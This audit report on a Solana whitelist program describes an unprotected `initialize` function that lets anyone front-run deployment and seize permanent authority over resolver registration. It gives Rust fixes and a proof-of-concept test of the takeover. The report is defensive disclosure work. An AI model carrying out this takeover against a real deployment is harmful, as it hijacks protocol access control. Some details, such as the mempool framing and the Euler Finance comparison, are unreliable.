# Audit Report

## Title
Unprotected Whitelist Initializer Enables Front-Running Attack and Permanent Authority Takeover

## Summary
The `initialize` function in the whitelist program lacks access control, allowing any attacker to front-run the legitimate initialization transaction and permanently seize control of the whitelist authority. This breaks the Access Control invariant and enables complete compromise of resolver permissions.

## Finding Description

The whitelist program's `initialize` function has no access control constraints, allowing any signer to call it and become the authority. [1](#0-0) 

The `Initialize` account validation struct only requires that the caller is a `Signer`, with no additional constraints on who can call this critical initialization function. [2](#0-1) 

The whitelist state PDA is deterministic, derived from a constant seed `b"whitelist_state"` with no additional parameters. [3](#0-2) 

This creates a critical front-running vulnerability:

1. **Legitimate Deployment Attempt**: The 1inch team submits an `initialize` transaction to set up the whitelist with their authority
2. **Front-Running Attack**: A malicious actor monitors the mempool, sees the initialization transaction, and submits their own `initialize` transaction with a higher priority fee
3. **Attacker Wins**: The attacker's transaction executes first, setting themselves as the permanent authority
4. **Legitimate Transaction Fails**: The legitimate initialization fails because Anchor's `init` constraint prevents reinitializing an already-initialized account
5. **Permanent Takeover**: The attacker now controls all resolver registration/deregistration operations through the `register` and `deregister` functions, which require authority authorization [4](#0-3) 

The `set_authority` function requires the current authority to sign, so there's no recovery mechanism once a malicious actor becomes the authority. [5](#0-4) 

This violates **CRITICAL INVARIANT #5: Access Control** - only authorized resolvers should be able to fill orders, but the attacker can now arbitrarily grant/revoke resolver access to anyone.

## Impact Explanation

**Severity: HIGH**

This vulnerability enables complete compromise of the protocol's access control system:

- **Permanent Authority Hijacking**: The attacker gains permanent, irrevocable control of the whitelist authority
- **Resolver Access Manipulation**: The attacker can register malicious resolvers or deregister legitimate ones at will
- **Protocol Disruption**: All order filling operations depend on resolver whitelist status, so the attacker can selectively enable/disable order execution
- **No Recovery Path**: Without redeploying the entire program (requiring governance and migration), there's no way to recover from this attack
- **Complete Access Control Bypass**: Breaks the fundamental security model where only trusted resolvers can fill orders

The impact affects all users of the Fusion Protocol, as the whitelist controls which resolvers can execute orders. A malicious authority could:
- Register themselves or colluding parties as resolvers to manipulate order execution
- Deregister all legitimate resolvers to halt the protocol
- Extort the protocol team for control restoration
- Front-run orders by controlling resolver access

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely because:

1. **Easy to Execute**: Monitoring the mempool for initialization transactions is trivial, and front-running with higher priority fees is a well-known attack vector
2. **One-Time Opportunity**: The initialization only happens once during deployment, making it a critical window of vulnerability
3. **No Technical Barriers**: Any attacker with basic Solana knowledge can submit an initialize transaction
4. **High Value Target**: Controlling the whitelist authority provides significant power and potential profit
5. **Public Deployment**: Program deployments are public and visible on-chain, making the initialization transaction easy to detect
6. **Deterministic PDA**: The whitelist state address is predictable, allowing attackers to prepare their front-running transaction in advance

The script showing initialization confirms this vulnerability is exploitable in practice. [6](#0-5) 

## Recommendation

Add access control to the `initialize` function by constraining it to a specific deployer authority or using a multi-step initialization process:

**Option 1: Hardcoded Deployer Authority**
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(
        mut,
        // Only allow initialization by the program upgrade authority or a specific deployer key
        constraint = authority.key() == DEPLOYER_AUTHORITY @ WhitelistError::Unauthorized
    )]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}

// Add constant for deployer authority
const DEPLOYER_AUTHORITY: Pubkey = pubkey!("YourTrustedDeployerPublicKeyHere");
```

**Option 2: Use Program Upgrade Authority**
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    /// CHECK: Validated against program data account
    pub program_data: AccountInfo<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}

pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Verify the authority is the program upgrade authority
    let program_data = &ctx.accounts.program_data;
    let program_id = ctx.program_id;
    
    // Derive the program data address
    let (expected_program_data, _) = Pubkey::find_program_address(
        &[program_id.as_ref()],
        &anchor_lang::solana_program::bpf_loader_upgradeable::id()
    );
    
    require_keys_eq!(
        program_data.key(),
        expected_program_data,
        WhitelistError::Unauthorized
    );
    
    // Deserialize and verify upgrade authority
    let program_data_account: UpgradeableLoaderState = 
        UpgradeableLoaderState::try_from_slice(&program_data.data.borrow())?;
    
    if let UpgradeableLoaderState::ProgramData { upgrade_authority_address, .. } = program_data_account {
        if let Some(upgrade_authority) = upgrade_authority_address {
            require_keys_eq!(
                ctx.accounts.authority.key(),
                upgrade_authority,
                WhitelistError::Unauthorized
            );
        } else {
            return Err(WhitelistError::Unauthorized.into());
        }
    } else {
        return Err(WhitelistError::Unauthorized.into());
    }

    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

## Proof of Concept

```rust
#[cfg(test)]
mod exploit_tests {
    use super::*;
    use anchor_lang::prelude::*;
    use solana_program_test::*;
    use solana_sdk::{
        signature::Keypair,
        signer::Signer,
        transaction::Transaction,
    };

    #[tokio::test]
    async fn test_unprotected_initializer_frontrun() {
        let program_id = Pubkey::new_unique();
        let mut program_test = ProgramTest::new(
            "whitelist",
            program_id,
            processor!(entry),
        );

        let (mut banks_client, payer, recent_blockhash) = program_test.start().await;

        // Legitimate authority attempting to initialize
        let legitimate_authority = Keypair::new();
        
        // Attacker monitoring mempool
        let attacker = Keypair::new();

        // Derive the deterministic whitelist state PDA
        let (whitelist_state, _) = Pubkey::find_program_address(
            &[b"whitelist_state"],
            &program_id,
        );

        // Attacker front-runs the initialization with higher priority fee
        let attacker_init_ix = initialize_instruction(
            &program_id,
            &attacker.pubkey(),
            &whitelist_state,
        );

        let mut attacker_tx = Transaction::new_with_payer(
            &[attacker_init_ix],
            Some(&attacker.pubkey()),
        );
        attacker_tx.sign(&[&attacker], recent_blockhash);
        
        // Attacker succeeds
        banks_client.process_transaction(attacker_tx).await.unwrap();

        // Legitimate authority tries to initialize but fails
        let legit_init_ix = initialize_instruction(
            &program_id,
            &legitimate_authority.pubkey(),
            &whitelist_state,
        );

        let mut legit_tx = Transaction::new_with_payer(
            &[legit_init_ix],
            Some(&legitimate_authority.pubkey()),
        );
        legit_tx.sign(&[&legitimate_authority], recent_blockhash);

        // This fails because account is already initialized
        let result = banks_client.process_transaction(legit_tx).await;
        assert!(result.is_err(), "Legitimate initialization should fail after attacker front-runs");

        // Verify attacker is now the authority
        let whitelist_account = banks_client
            .get_account(whitelist_state)
            .await
            .unwrap()
            .unwrap();
        
        let whitelist_data: WhitelistState = 
            WhitelistState::try_deserialize(&mut &whitelist_account.data[8..]).unwrap();
        
        assert_eq!(
            whitelist_data.authority,
            attacker.pubkey(),
            "Attacker should be the authority"
        );

        // Attacker now controls all resolver registration
        // They can register themselves or malicious resolvers
        let malicious_resolver = Keypair::new();
        
        let register_ix = register_instruction(
            &program_id,
            &attacker.pubkey(),
            &malicious_resolver.pubkey(),
        );

        let mut register_tx = Transaction::new_with_payer(
            &[register_ix],
            Some(&attacker.pubkey()),
        );
        register_tx.sign(&[&attacker], recent_blockhash);
        
        // Attacker successfully registers their malicious resolver
        banks_client.process_transaction(register_tx).await.unwrap();

        println!("✓ Attacker successfully front-ran initialization");
        println!("✓ Attacker is now permanent whitelist authority");
        println!("✓ Attacker can register/deregister any resolvers");
        println!("✗ Protocol access control is completely compromised");
    }
}
```

**Alternative Reproduction Steps** (using Anchor testing framework):

1. Deploy the whitelist program to a test network
2. Have an attacker monitor for initialization transactions
3. Attacker submits their own `initialize` transaction with higher compute unit price
4. Attacker's transaction executes first, setting them as authority
5. Verify the attacker can now call `register` and `deregister` while legitimate authority cannot
6. Attempt to call `set_authority` - only the attacker can change authority now

## Notes

- This is a **critical deployment vulnerability** that must be fixed before mainnet deployment
- While Solana's runtime prevents true race conditions through transaction serialization, front-running attacks are still possible and highly likely during deployment
- The vulnerability exists despite proper use of Anchor's `init` constraint - the issue is missing access control, not the initialization mechanism itself
- Similar vulnerabilities have been exploited in other DeFi protocols (e.g., Euler Finance governance takeover)
- The fix must be implemented before program deployment, as there's no recovery mechanism after a malicious initialization
- Consider using a multi-signature setup or DAO governance for the initial authority to prevent single-point-of-failure risks

### Citations

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L43-58)
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L60-84)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Register<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L111-123)
```rust
#[derive(Accounts)]
pub struct SetAuthority<'info> {
    #[account(mut)]
    pub current_authority: Signer<'info>,
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
}
```

**File:** scripts/whitelsit/initialize.ts (L20-42)
```typescript
async function initialize(
  connection: Connection,
  program: Program<Whitelist>,
  authorityKeypair: Keypair
): Promise<void> {
  const whitelistState = findWhitelistStateAddress(program.programId);

  const initializeIx = await program.methods
    .initialize()
    .accountsPartial({
      authority: authorityKeypair.publicKey,
      whitelistState,
    })
    .signers([authorityKeypair])
    .instruction();

  const tx = new Transaction().add(initializeIx);

  const signature = await sendAndConfirmTransaction(connection, tx, [
    authorityKeypair,
  ]);
  console.log(`Transaction signature ${signature}`);
}
```
